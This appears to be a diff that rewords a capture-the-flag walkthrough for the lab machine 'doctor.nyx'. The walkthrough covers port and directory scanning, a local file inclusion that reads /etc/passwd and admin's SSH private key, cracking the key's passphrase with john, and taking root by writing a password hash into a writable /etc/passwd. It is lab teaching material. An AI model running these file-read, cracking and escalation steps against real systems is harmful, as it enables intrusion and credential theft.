@@ -14,9 +14,9 @@ A Local File Inclusion vulnerability in `doctor-item.php` is used to read `admin
 
 ## Enumeration
 
-### Port Scanning
+### Port Enumeration
 
-A full TCP port scan is run first:
+A full TCP port scan comes first:
 
 ```bash
 $ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn doctor.nyx
@@ -27,7 +27,7 @@ PORT   STATE SERVICE REASON
 MAC Address: 00:0C:29:E1:32:2E (VMware)
 ```
 
-Two ports are found open: **22 (SSH)** and **80 (HTTP)**. A version/script scan against both fills in the details:
+Two ports come back open: **22 (SSH)** and **80 (HTTP)**. A version and script scan on both fills in the details:
 
 ```bash
 $ sudo nmap -p 22,80 -sCV doctor.nyx
@@ -52,9 +52,10 @@ The main page:
 ```
 http://doctor.nyx
 ```
+
 <img src="../Images/doctor/Pasted image 20260518171830.png"/>
 
-A directory scan is run to look for pages not linked from the front page:
+A directory scan looks for pages not linked from the front page:
 
 ```bash
 $ gobuster dir -u 'http://doctor.nyx/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
@@ -89,6 +90,7 @@ Finished
 ```
 http://doctor.nyx/doctor-item.php?include=Doctors.html
 ```
+
 <img src="../Images/doctor/Pasted image 20260518171912.png"/>
 
 `ffuf` fuzzes for payloads that break out of the expected file, filtering on word count to cut out identical "not found"-style responses:
@@ -115,27 +117,30 @@ $ ffuf -u 'http://doctor.nyx/doctor-item.php?include=FUZZ' -w /usr/share/seclist
 ../../../../../../etc/passwd     [Status: 200, Size: 1392, Words: 13, Lines: 27, Duration: 15ms]
 ```
 
-Confirmed directly:
+A quick check confirms it directly:
 
 ```
 view-source:http://doctor.nyx/doctor-item.php?include=/etc/passwd
 ```
+
 <img src="../Images/doctor/Pasted image 20260518172000.png"/>
 
 ### Reading admin's SSH Key
 
-With arbitrary file read confirmed, the same parameter is pointed at a private key:
+With arbitrary file read confirmed, the same parameter points at a private key:
 
 ```
 view-source:http://doctor.nyx/doctor-item.php?include=/home/admin/.ssh/id_rsa
 ```
+
 <img src="../Images/doctor/Pasted image 20260518172016.png"/>
 
-A first connection attempt with the recovered key confirms it's passphrase-protected before going any further:
+A first connection attempt with the recovered key shows it's passphrase-protected before going any further:
 
 ```bash
 $ chmod 600 admin_rsa
 ```
+
 ```bash
 $ ssh -i admin_rsa admin@doctor.nyx
 The authenticity of host 'doctor.nyx (doctor.nyx)' can't be established.
@@ -148,11 +153,12 @@ Enter passphrase for key 'admin_rsa':
 
 ### Cracking the Passphrase
 
-The key is passphrase-protected. Its hash is extracted and cracked:
+With the key confirmed passphrase-protected, `ssh2john` extracts the hash and `john` cracks it against `rockyou.txt`:
 
 ```bash
 $ ssh2john admin_rsa > admin_rsa.hash
 ```
+
 ```bash
 $ john admin_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
@@ -196,7 +202,7 @@ admin@doctor:~$ find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -p
 -rw-rw-r-- 1 root root 1404 May 18 16:47 /etc/passwd
 ```
 
-`/etc/passwd` itself is writable. On most modern systems the password field there is just a placeholder (`x`), with the real hash living in `/etc/shadow` instead — but if `/etc/passwd` can be edited directly, a password hash placed in that second field is honored on its own, without touching `/etc/shadow` at all. `openssl passwd` generates a hash in the right format for a chosen password:
+`/etc/passwd` itself is writable. On most modern systems the password field there is just a placeholder (`x`), with the real hash living in `/etc/shadow` instead — but if `/etc/passwd` can be edited directly, a password hash placed in that second field is honored on its own, without touching `/etc/shadow` at all. `openssl passwd` generates a hash in the right format for a chosen password (here, the word `root`):
 
 ```bash
 admin@doctor:~$ openssl passwd root
@@ -232,6 +238,8 @@ sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
 systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
 admin:x:1000:1000:admin:/home/admin:/bin/bash
 ```
+
+With `root`'s password field now set to a hash for the word `root`, `su` accepts it:
 
 ```bash
 admin@doctor:~$ su root
